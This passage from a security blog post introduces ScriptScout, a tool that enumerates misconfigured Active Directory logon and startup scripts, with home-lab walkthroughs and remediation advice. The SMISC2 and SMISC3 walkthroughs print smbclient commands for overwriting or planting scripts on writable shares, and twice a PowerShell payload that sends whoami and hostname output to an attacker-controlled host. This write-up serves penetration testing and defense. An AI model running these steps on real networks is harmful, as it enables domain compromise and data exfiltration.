+<p>Since &ldquo;Automation Scripts&rdquo; configured using all methods (through &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">Group Policy Script</a>&rdquo;, &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">ScriptPath</a>&rdquo; and &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO &ldquo;Scheduled Task</a>&rdquo;) are automatically placed inside the SYSVOL folder (so also inside NETLOGON), which i want to remind that&rsquo;s by default readable by the &ldquo;Authenticated Users&rdquo; group (and therefore by any authenticated &ldquo;Principal&rdquo; including an authenticated attacker), an attacker impersonating ANY domain user (even with minimal privileges) could retrieve these &ldquo;Automation Scripts&rdquo; and analyze them offline to identify potential misconfigurations.</p>
+<p>To automate these checks, i have developed &ldquo;ScriptScout&rdquo;, a tool that will enumerate (it will NOT perform exploitation) the various misconfigurations identified within the infrastructure that i classified from SMISC1 (Script Misconfiguration 1) to SMISC5 (Script Misconfiguration 5).</p>
+<span id=5>
+<blockquote>
+<p>For OPSEC motivation and thus to avoid further querying the DC, ScriptScout will not execute any LDAP queries to report which OU is associated with the GPO that set up the vulnerable &ldquo;Automation Script&rdquo; or which domain user is associated with the &ldquo;Logon Script&rdquo; via ScriptPath, so, these verification must be performed manually using other tools such as BloodHound.</p></blockquote>
+<blockquote>
+<p>When performing attacks from a Linux machine NOT joined to the domain, although it is not mentioned in subsequent examples, when using SMBClient and targeting the machines using their hostname, in reality i have resolved their machine name by entering it in the &ldquo;/etc/hosts&rdquo; file, that said SMBClient still supports connecting using the IP.</p></blockquote>
+<span id=9>
+<h2 id="smisc1-plaintext-credentials-stored-inside-scripts"><strong>SMISC1: Plaintext Credentials Stored Inside Scripts.</strong></h2>
+<p>If elevated privileges (typically administrative) are required to access an SMB File Share, but a specific domain user lacking those privileges needs to map that share, administrators often avoid granting the necessary privileges directly to that user; instead, they configure a Logon Script that uses the &ldquo;net use&rdquo; command to map the target network share by embedding the required credentials in plain-text within the command.</p>
+<p>Although these actions are particularly convenient from an administrative standpoint for managing an infrastructure, since &ldquo;Automation Scripts&rdquo; are accessible to anyone, an attacker could retrieve these scripts and thus also obtain those credentials specified in plaintext.</p>
+<p>By running ScriptScout, it can be observed that it has identified two different Logon Scripts (one configured via <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">Group Policy Script</a>, the other one configured via the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a>) that map network SMB shares specifying domain credentials in clear text such as: &ldquo;helpdeskadmin&rdquo;-&ldquo;Password1234!&rdquo; &amp; &ldquo;tstark&rdquo;-&ldquo;Password123&rdquo; inside the &ldquo;net use&rdquo; command.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/1.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Indeed, as a further verification, if we manually inspect these &ldquo;Automation Scripts&rdquo; inside SYSVOL, we will find credentials hardcoded within the &ldquo;net use&rdquo; command.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/2.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<br>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/3.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Based on the permissions assigned to the domain user retrieved, the attacker can proceed with further actions; in this case, &ldquo;MARVEL\tstark&rdquo; is a &ldquo;Domain Admin&rdquo; and consequently the attacker is able to compromise the entire domain.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/4.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong>Remediation</strong>: Use the GPO Drive Mapping (<a href="https://v2cloud.com/blog/how-to-map-network-drives-with-gpo-map">1</a>, <a href="https://activedirectorypro.com/map-network-drives-with-group-policy/">2</a>); alternatively, remove any plaintext credentials and provide the end user with the necessary permissions to access the target SMB share.​​</p>
+<span id=14>
+<h2 id="smisc2-find-a-script-that-execute-a-remote-file-hosted-on-a-smb-share-where-the-file-itself-or-its-parent-folder--smb-share-has-excessive-permissions-so-the-file-inherits-those-permissions"><strong>SMISC2: Find a Script that execute a remote file hosted on a SMB Share, where the file itself or its parent folder / SMB Share has excessive permissions (so the file inherits those permissions).</strong></h2>
+<p>Before proceeding, it is important to be aware that on Windows, both <a href="https://superuser.com/questions/897180/whats-the-difference-between-sharing-and-advanced-sharing-in-windows-server-200">SMB Share permissions and NTFS permissions exist</a>; if the permissions at the SMB Share level (network level) are overly permissive (e.g. Everyone Group - FullControl) and the same is true at the NTFS level (e.g. Everyone Group - FullControl), then an attacker could remotely modify the file targeted by the &ldquo;Automation Script&rdquo; and thereby indirectly execute arbitrary commands by impersonating the victim domain user that will executes this &ldquo;Automation Script&rdquo;.</p>
+<blockquote>
+<p>ScriptScout is only able to enumerate NTFS permissions and not SMB Share (network) permissions, so the tool&rsquo;s output will be exploitable only if also network level permissions allow it (to determine this, a manual check is required; in other words, it is sufficient to attempt the modification, which means to perform an attack attempt, if the attempt is successful it will be confirmed that excessive SMB share permissions are also present).</p></blockquote>
+<p>By running ScriptScout, it can be observed that the &ldquo;run.bat&rdquo; file located on the &ldquo;business_folder&rdquo; SMB share  (specifically at <code>\\192.168.52.132\business_folder\magement_file\run.bat</code>) grants &ldquo;FullControl&rdquo; to the &ldquo;Everyone&rdquo; or &ldquo;Domain Users&rdquo; group, so to any domain user; as a consequence of this, an attacker impersonating any domain user could modify the &ldquo;run.bat&rdquo; file by inserting arbitrary commands, which would then be executed by the victim user (so a domain user for Logon &amp; LogOff Scripts, the local &ldquo;NT\ Authority System&rdquo; user for Start &amp; Shutdown Scripts and any user type in the case of GPO Scheduled Tasks).</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/5.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<span id=10>
+<blockquote>
+<p>This misconfiguration is due to the fact that the SysAdmin assigned &ldquo;FullControl&rdquo; permissions (in reality, only &ldquo;Write&rdquo; permission is sufficient to conduct an attack and ScriptScout also handles this scenario) to the &ldquo;Everyone&rdquo; or &ldquo;Domain Users&rdquo; group on the SMB share &ldquo;business_folder&rdquo; (so the file &ldquo;run.bat&rdquo; contained within inherits this permission), or on a parent folder of the file &ldquo;run.bat&rdquo; (and thus the &ldquo;run.bat&rdquo; file inside inherits the permission), or directly on the &ldquo;run.bat&rdquo; file itself; the &ldquo;ScriptScout&rdquo; tool covers all these scenarios.</p></blockquote>
+<p>Furthermore, since ScriptScout saves all the &ldquo;Automation Scripts&rdquo; inside the &ldquo;script_collected&rdquo; folder created in the current directory from which the tool has been launched, by performing a simple &ldquo;grep&rdquo; it is possible to determine which specific &ldquo;Automation Script&rdquo; contains the execution of the remote file located at <code>\\192.168.52.132\business_folder\management_file\run.bat</code>; in this case, by examining the path &ldquo;\policies\GUID\User\Script\Logon,&rdquo; we can deduce that this &ldquo;Automation Script&rdquo; is actually a <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#6">Logon Script</a> configured via <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO (specifically as a Group Policy Script)</a>.</p>
+<pre tabindex="0"><code># grep &lt;filename&gt; ./scripts_collected/
+</code></pre>
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/6.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<blockquote>
+<p>In this case we also found out that the IP &ldquo;192.168.52.132&rdquo; is the &ldquo;THEPUNISHER&rdquo; machine.</p></blockquote>
+<span id=8>
+<p>Subsequently, to determine which users are impacted by this &ldquo;Automation Script&rdquo; (in this case, a Logon Script) and therefore identify the potential victims of the SMISC2 attack, <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#5">as previously mentioned</a>, the tester must enumerate this information manually for example using BloodHound; since the target in this example is within my home laboratory, we can observe how this <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO</a> with that GUID is actually named &ldquo;smisc2_automationscript&rdquo; (DisplayName) and is directly linked to the MARVEL.local domain, it means that ALL domain users (because it is a Logon Script) that perform a &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#6">Logon</a>&rdquo; will becomes the victims of this attack.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/7.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<blockquote>
+<p>If the Automation Script vulnerable to SMISC2 is located within &ldquo;<code>\\&lt;dc-hostname&gt;\SYSVOL\Scripts\&lt;SMISC2_vulnerable_filename&gt;</code>&rdquo;, this means that such Automation Script can be executed either through the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a> of a domain user or through a <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a>, in the first instance the attacker will need to manually retrieve and correlate data to understand which user is impacted (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#8">in a manner similar to what has already been described</a>), in the second case, since ScriptScout also downloads all the &ldquo;ScheduledTask.xml&rdquo; files inside the &ldquo;ScheduledTaskConf_collected&rdquo; folder, the attacker by running a grep can quickly identify if such &ldquo;Automation Script&rdquo; vulnerable to SMISC2 is triggered via &ldquo;GPO Scheduled Task&rdquo;, in this scenario by analyzing the identified &ldquo;ScheduledTask.xml&rdquo; file it will also be possible to understand the execution logic (e.g. trigger &ldquo;On Workstation Lock&rdquo;) and with which user the vulnerable Automation Script will be executed.</p></blockquote>
+<p>Now the attacker needs to verify if he also has permissions at the SMB (network) level and to do this he could simply attempt to edit the target file effectively performing the attack, if as in this case the result of the modification is positive then the attack has succeeded and in this way we have indirectly confirmed that an attacker possesses all the necessary permissions.</p>
+<p>So:</p>
+<ol>
+<li>
+<p><strong>We use, for example, &ldquo;smbclient&rdquo; to first download <code>\\THEPUNISHER\business_folder\management_file\run.bat</code>:</strong></p>
+<pre tabindex="0"><code># smbclient //&lt;hostname&gt;/&lt;fileshare_smb&gt; -U &#39;&lt;domain&gt;\\&lt;domain_user&gt;%&lt;password&gt;&#39; -c &#34;get &lt;fullpath_automationscript&gt; &lt;local_file&gt;/&lt;automationscript_name&gt;&#34;
+</code></pre>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/8.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+<li>
+<p><strong>Append</strong> (DO NOT remove data contained within / DO NOT overwrite the file content – this would cause a service disruption) <strong>the malicious content, for example the following arbitrary code:</strong></p>
+<pre tabindex="0"><code>powershell -Command &#34;$data = (whoami) + &#39;|&#39; + (hostname); $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data)); Invoke-WebRequest -Uri \&#34;http://&lt;ip_attacker&gt;/?a=$encoded\&#34; -UseBasicParsing&#34;
+</code></pre>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/9.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+<p>This code executes the &ldquo;whoami&rdquo; and &ldquo;hostname&rdquo; commands and sends the output in base64 format to a Web Server hosted by the attacker, in reality the attacker could create local accounts on the machine (if the impersonated user has sufficient privileges), spawn a Reverse Shell, execute a beacon to establish a connection to the C2 and so on.</p>
+<blockquote>
+<p>The syntax of the arbitrary command to be inserted inside the file to be modified varies according to the language it uses, for example if you modify a .VBS file, the code indicated above may not work.</p></blockquote>
+</li>
+</ol>
+<span id=9>
+<ol start="3">
+<li>
+<p><strong>We use, for example, &ldquo;smbclient&rdquo; to finally upload and thus overwrite the original &ldquo;Automation Script&rdquo; with the malicious &ldquo;Automation Script&rdquo;.</strong></p>
+<pre tabindex="0"><code># smbclient //&lt;hostname&gt;/&lt;fileshare_smb&gt; -U &#39;&lt;domain&gt;\\&lt;domain_user&gt;%&lt;password&gt;&#39; -c &#34;put &lt;local_file&gt;/&lt;automationscript_name&gt; &lt;fullpath_automationscript&gt;&#34;
+</code></pre>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/10.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+</ol>
+<p>Now, after the GPO modification has propagated correctly (by default this takes 90 minutes, otherwise if you have access to the machine you can use the &ldquo;gpupdate /force&rdquo; command), if for example the user &ldquo;MARVEL\pparker&rdquo; (we know that the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#8">GPO is applied at the domain level</a> and therefore affects every domain user) logs for example onto the SPIDERMAN machine, the machine impersonating the domain user &ldquo;MARVEL\pparker&rdquo; will execute the LogonScript &ldquo;misc2_logonscript&rdquo;, consequently, it will then execute the &ldquo;run.bat&rdquo; file containing the malicious PAYLOAD previously injected by the attacker, so following this event we may observe how the attacker has actually succeeded in carrying out data exfiltration.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/11.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<span id=13>
+<p>As further demonstration of this, since in this scenario we are performing everything in our own lab environment, by inspecting the various permissions we can see how they are misconfigured both at the SMB (network share) level and at the NTFS level.</p>
+<p>Below are the NTFS-level permissions (which ScriptScout is able to detect), specifically, the FullControl permission has been granted directly to the &ldquo;business_folder&rdquo; share and consequently the &ldquo;run.bat&rdquo; file has inherited all those permissions.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/12.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>This is also reflected in the following screenshot.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/13.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>Below are the permissions at the SMB (network share) level (which ScriptScout is NOT able to detect), as you can see the &ldquo;Everyone&rdquo; group has FullControl permissions and in fact the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#9">modification was successful</a>.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/14.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>This is also reflected in the following screenshot.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/15.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<blockquote>
+<p>If the Sysadmin had granted excessive Read &amp; Write permissions EXCLUSIVELY on the &ldquo;run.bat&rdquo; file and not on its Parent Folder or directly on the SMB Share, by default the attacker would NOT have permission to list the contents of the &ldquo;business_folder&rdquo; SMB Share and as a result, this would apparently block exploitation; that said, in reality, since the attacker knows the entire relative path of the vulnerable file (since it is referenced within the &ldquo;Automation Script&rdquo;), <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#10">as previously mentioned</a>, he could still download or overwrite it if targeted directly.</p>
+<p> 
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/16.png"  class="center"  style="border-radius: 8px;"  />
+
+ </p></blockquote>
+<p><strong>Remediation</strong>: Analyze all the &ldquo;Automation Scripts&rdquo; present within the infrastructure, retrieve the SMB paths contained within them, and verify that the share files themselves (as well as the folders and files inside the share) do not have excessive permissions, because if an &ldquo;Automation Script&rdquo; executes a file with excessive permissions an attacker could perform the type of attack called SMISC2.</p>
+<span id=15>
+<h2 id="smisc3-find-a-script-that-executes-a-non-existent-remote-file-hosted-on-an-smb-share-where-its-parent-folder--smb-share-has-excessive-permissions"><strong>SMISC3: Find a Script that executes a non-existent remote file hosted on an SMB share, where its parent folder / SMB share has excessive permissions.</strong></h2>
+<p>SMISC3 follows the same initial considerations already made for <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#9">SMISC2</a>, therefore instead of rewriting everything, it is recommended to review that section.</p>
+<p>By running ScriptScout, it is possible to observe how an Automation Script attempts to execute the remote file &ldquo;not_exist_file.bat&rdquo; located on the SMB share named &ldquo;business_folder&rdquo; (specifically at the path <code>\\192.168.52.132\business_folder\magement_file\not_exist_file.bat</code>), since this file does NOT exist and its parent folder or the SMB share itself grants &ldquo;FullControl&rdquo; permission to the &ldquo;Authenticated Users&rdquo; group, an attacker impersonating any domain user or Computer Account could first create the &ldquo;not_exist_file.bat&rdquo; file, insert the malicious payload inside it, and finally upload it to the specific path where the Automation Script will attempt to call it; in this way, the malicious file will later be executed by the victim user (so a domain user for Logon &amp; LogOff Scripts, the local “NT\ Authority System” user for Start &amp; Shutdown Scripts and any user type in the case of GPO Scheduled Tasks), and the attack will be successful.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/17.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<blockquote>
+<p>This misconfiguration is due to the fact that the SysAdmin assigned “FullControl” permissions (in reality, only “Write” permission is sufficient to conduct an attack and ScriptScout also handles this scenario) to the &ldquo;Authenticated Users&rdquo; group on the SMB share “business_folder”, for this reason the attacker has properly permission to create and add any arbitrary file inside it.</p></blockquote>
+<p>Furthermore, since ScriptScout saves all &ldquo;Automation Scripts&rdquo; inside the &ldquo;script_collected&rdquo; folder created in the current directory from which the tool has been launched, by performing a simple &ldquo;grep&rdquo; it is possible to determine which &ldquo;Automation Script&rdquo; contains the execution of the remote file located at <code>\\192.168.52.132\business_folder\magement_file\not_exist_file.bat</code>; in this case, by examining the path &ldquo;\policies\GUID\Machine\Startup&rdquo; we understand that such &ldquo;Automation Script&rdquo; is actually a <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#11">Startup Script</a> configured through <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO (specifically as a Group Policy Script)</a>.</p>
+<pre tabindex="0"><code># grep &lt;filename&gt; ./scripts_collected/
+</code></pre>
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/18.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<blockquote>
+<p>In this case we also found out that the IP “192.168.52.132” is the “THEPUNISHER” machine.</p></blockquote>
+<span id=12>
+<p>Subsequently, to determine which users are impacted by this &ldquo;Automation Script&rdquo; (in this case, a Startup Script) and therefore identify the potential victims of the SMISC3 attack, <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#5">as previously mentioned</a>, the tester must enumerate this information manually for example using BloodHound; since the target in this example is within my home laboratory, we can observed how this <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO</a> with that GUID is actually named &ldquo;smisc3_automationscript&rdquo; (DisplayName) and is directly linked to the MARVEL.local domain, it means that ALL domain joined Computers (because it is a Startup Script) that perform a &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#11">StartUp</a>&rdquo; will becomes the victim of this attack.</p>
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/19.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<blockquote>
+<p>If the missing Automation Script is located within <code>\\&lt;dc-hostname&gt;\SYSVOL\Scripts\&lt;SMISC3_vulnerable_file_name&gt;</code>, this means that such missing Automation Script and therefore vulnerable to SMISC3 could be executed either via the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a> of a domain user or through a <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a>, in the first scenario, the attacker must manually retrieve and correlate data to identify which user is impacted (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#12">in a manner similar to what has already been described</a>), in the second case, since ScriptScout also downloads all &ldquo;ScheduledTask.xml&rdquo; files within the &ldquo;ScheduledTaskConf_collected&rdquo; folder, the attacker by using grep can quickly verify if such missing Automation Script vulnerable to SMISC3 is triggered via &ldquo;GPO Scheduled Task&rdquo;, in this scenario by analyzing the identified &ldquo;SchedulTask.xml&rdquo; file it will also be possible to understand the execution logic (e.g. trigger &ldquo;On Workstation Lock&rdquo;) and with which user the Automation Script eventually created by the attacker will be executed.</p></blockquote>
+<p>Now the attacker needs to verify if he also has permissions at the SMB (network) level and to do so, he could simply attempt to upload the malicious file into the target SMB share, so effectively performing the attack; if, as in this case, the result is positive we have indirectly confirmed that an attacker possesses all the necessary permissions.</p>
+<p>So:</p>
+<ol>
+<li>
+<p><strong>Create the malicious file &ldquo;not_exist_file.bat&rdquo; containg the malicious PAYLOAD, for example the following arbitrary code:</strong></p>
+<pre tabindex="0"><code>powershell -Command &#34;$data = (whoami) + &#39;|&#39; + (hostname); $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data)); Invoke-WebRequest -Uri \&#34;http://&lt;ip_attacker&gt;/?a=$encoded\&#34; -UseBasicParsing&#34;
+</code></pre>
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/20.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+<p>This code executes the “whoami” and “hostname” commands and sends the output in base64 format to a Web Server hosted by the attacker, in reality the attacker could create local accounts on the machine (if the impersonated user has sufficient privileges), spawn a Reverse Shell, execute a beacon to establish a connection to the C2 and so on.</p>
+<blockquote>
+<p>The syntax of the arbitrary command to be inserted inside the file to be modified varies according to the language it uses, for example if you modify a .VBS file, the code indicated above may not work.</p></blockquote>
+</li>
+<li>
+<p><strong>Then upload the malicious file into the SMB remote path where the Automation Script will try to execute the &ldquo;not_exist_file.bat&rdquo; file.</strong></p>
+
+        <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/21.png"  class="center"  style="border-radius: 8px;"  />
+    
+
+</li>
+</ol>
+<p>Now, after the GPO modification has correctly propagated (by default this takes 90 minutes, otherwise if you have access to the machine you can use the &ldquo;gpupdate /force&rdquo; command), for example if the SPIDERMAN machine (we know the GPO is applied at the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#12">domain level</a> and therefore affects every domain joined Computer) performs a StartUp (powers on), the machine impersonating its own Computer Account SPIDERMAN$ authenticates via NTLM (because Kerberos fails) to the share //THEPUNISHER/business_folder, retrieves the script &ldquo;not_exist_file.bat&rdquo; and executes it locally under the &ldquo;NT AUTHORITY\System&rdquo; account; as a demonstration of this, following this event, it can be observed how the attacker has actually succeeded in performing data exfiltration.</p>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/23.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<p>To see how everything was configured inside the home made lab, refer to the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#13">previous section</a> since the configuration was almost the same.</p>
+<p><strong>Remediation</strong>: Analyze all &ldquo;Automation Scripts&rdquo; present in the infrastructure, retrieve the SMB paths contained within them, and verify that the file shares themselves and the folders contained within do not have excessive permissions, because if an &ldquo;Automation Script&rdquo; executes a file that does NOT exist and excessive permissions are present on the parent folder or on the SMB share itself, an attacker could carry out the attack type called SMISC3.</p>
+<span id=33>
+<h2 id="smisc4-the-script-itself-contained-inside-the-sysvol--netlogon-has-excessive-permission"><strong>SMISC4: The Script itself contained inside the SYSVOL / NETLOGON has excessive permission</strong></h2>
+<p>Sometimes it may happen that the Automation Script itself, located inside SYSVOL (and consequently also in the NETLOGON share), specifically in the path <code>\\&lt;dc-hostname&gt;\SYSVOL\Scripts\&lt;automation_script&gt;</code>, so the Automation Script commonly configured either through the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a> or via <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">&ldquo;GPO Scheduled Task&rdquo;</a>, has excessive permissions and so the attacker is able to edit it directly, if this scenario occurs, an attacker could therefore edit the content of this &ldquo;Automation Script&rdquo; by inserting any malicious commands which will be executed by the victim user.</p>
+<blockquote>
+<p>Exactly like for <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#14">SMISC2</a> &amp; <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#15">SMISC3</a>, in order to edit a file contained within an SMB share it is necessary to have permissions both at the NTFS level and at the SMB share (network) level, since <a href="https://learn.microsoft.com/en-us/answers/questions/1669364/can-the-everyone-read-share-permission-be-remove">by default</a> the SMB share SYSVOL &amp; NETLOGON hosted on the DC offers &ldquo;FullControl&rdquo; permissions (SMB network level) to the &ldquo;Authenticated Users&rdquo; group, if ScriptScout identifies excessive permissions at the NTFS level (the tool is capable of this) the attacker will have almost certainty of being able to perform the SMISC4.</p></blockquote>
+<blockquote>
+<p>Although SMISC4 could also be present on Automation Scripts contained inside <code>/SYSVOL/&lt;domain&gt;/Policies/&lt;GPO_GUID&gt;/&lt;User OR Machine&gt;/scripts/&lt;Logon OR Logoff OR StartUp Or Shutdown/*</code>, so an &ldquo;Automation Scripts&rdquo; executed through <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#1">GPO (Group Policy Script)</a>, since this is an extremely rare scenario, ScriptScout does not cover it.</p></blockquote>
+<p>By running ScriptScout, we can see that the Automation Script &ldquo;misc4_logonscript.cmd&rdquo; (contained within SYSVOL &amp; NETLOGON) grants the &ldquo;FullControl&rdquo; permission to the &ldquo;Everyone&rdquo; or &ldquo;Domain Users&rdquo; group, so to any domain user, in other words, the attacker will be able to directly modify the file &ldquo;misc4_logon.script.cmd&rdquo; by inserting arbitrary commands that will then be executed by the victim user.</p>
+<span id=16>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/24.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<blockquote>
+<p>This misconfiguration is due to the fact that the SysAdmin granted &ldquo;FullControl&rdquo; permissions (in reality, only &ldquo;Write&rdquo; permission is sufficient to carry out an attack and ScriptScout also manages this scenario) to the &ldquo;Everyone&rdquo; or &ldquo;Domain Users&rdquo; group on the SMB share &ldquo;script&rdquo; (and therefore the &ldquo;Automation Scripts&rdquo; contained within inherit this permission) or &ldquo;NETLOGON&rdquo; share (and therefore the &ldquo;Automation Scripts&rdquo; contained within inherit this permission) or directly on the Automation Script itself such as the file &ldquo;misc4_logonscript.cmd&rdquo;; the &ldquo;ScriptScout&rdquo; tool manages all scenarios and since exploitation is similar, although the tool performs this control under-the-hood in a distinct way, the output will be the same and transparent to the tool user.</p></blockquote>
+<p>Furthermore, since an Automation Script vulnerable to SMISC4 can commonly be configured either via <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">&ldquo;GPO Scheduled Task&rdquo;</a> or through the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a>, ScriptScout will specify the situation encountered; in the first case, since the tool downloads all the &ldquo;ScheduledTask.xml&rdquo; files inside the &ldquo;ScheduledTaskConf_collected&rdquo; folder, using a grep <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#18">the tool will automatically notify you if such occurrence arises</a>, if this scenario is not present then it is probably the second scenario and consequently the tool will suggest to you that the impacted Automation Script is probably being used by the <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#2">&ldquo;ScriptPath&rdquo; property</a> (<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#16">as in our case</a>); in this case, since the tool flags this scenario, the tester will have to enumerate this information manually, for example using BloodHound; since the target in this example is inside my home-made laboratory, we can see how this &ldquo;Automation Script&rdquo; is associated with the domain user &ldquo;MARVEL\pparker&rdquo;, as a result of this when this domain user logs on to any domain-joined machine, that machine will execute this <a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#6">Logon Script</a> impersonating the respective domain user.</p>
+<span id=17>
+
+      <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/25.png"  class="center"  style="border-radius: 8px;"  />
+  
+
+<span id=18>
+<blockquote>
+<p>If the Automation Script were executed via &ldquo;<a href="/posts/introducing_scripscouttransforming_smooth_ad_automation_scripts_into_attack_vectors/#3">GPO Scheduled Task</a>&rdquo;, the ScriptScout tool would have flagged this scenario as follows:
+
+    <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/26.png"  class="center"  style="border-radius: 8px;"  />
+
+</p></blockquote>
+<p>So:</p>
+<ol>
+<li>
+<p><strong>For example, we use &ldquo;smbclient&rdquo; to first download <code>\\&lt;hostname-dc&gt;\SYSVOL\&lt;domain&gt;\scripts\&lt;SMISC4_vulnerable_script&gt;</code></strong></p>
+<pre tabindex="0"><code># smbclient //&lt;hostname-ip_dc&gt;/SYSVOL -U &#39;&lt;domain&gt;\\&lt;domain_user&gt;%&lt;password&gt;&#39; -c &#34;get &lt;fullpath_automationscript&gt; &lt;local_file&gt;/&lt;automationscript_name&gt;&#34;
+</code></pre>
+       <img src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/27.png"  class="center"  style="border-radius: 8px;"  />
+   
+
+</li>
+<li>
